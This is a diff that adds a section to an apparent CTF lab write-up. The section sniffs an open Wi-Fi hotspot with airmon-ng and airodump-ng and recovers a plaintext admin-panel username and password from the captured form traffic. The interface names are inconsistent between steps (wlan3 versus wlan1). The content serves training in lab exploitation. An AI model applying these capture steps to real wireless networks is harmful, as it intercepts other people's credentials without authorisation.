@@ -56,3 +56,29 @@ wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_d
 000000291:   301        7 L      12 W       178 Ch      "assets"       
 000001225:   302        0 L      0 W        0 Ch        "logout"
 ```
+
+### Wireless traffic capture
+After nothing found, i almost got crazy. Returned to the first target machine and noticed that there is another wlan interface and it is strange in a ctf, so tried to sniff traffic.
+
+First connect to the wifi hotspot with wlan2, after that i had to put wlan3 in monitor mode and capture traffic in the specific channel.
+
+```bash
+sudo airmon-ng check kill
+sudo airmon-ng start wlan3
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 02:00:00:00:00:00  -28   0     2707      510   10   6   54   OPN              HTB International Wifi
+```
+
+```bash
+sudo airodump-ng -c 6 --bssid  02:00:00:00:00:00 -w mi_captura wlan1
+```
+
+After that, opened wireshark and listen in wlan3mon interface and found a valid credentials to the admin panel. 
+```bash
+HTML Form URL Encoded: application/x-www-form-urlencoded
+    Form item: "username" = "jenny"
+    Form item: "password" = "Fl1ghtDeck2026!"
+```
+
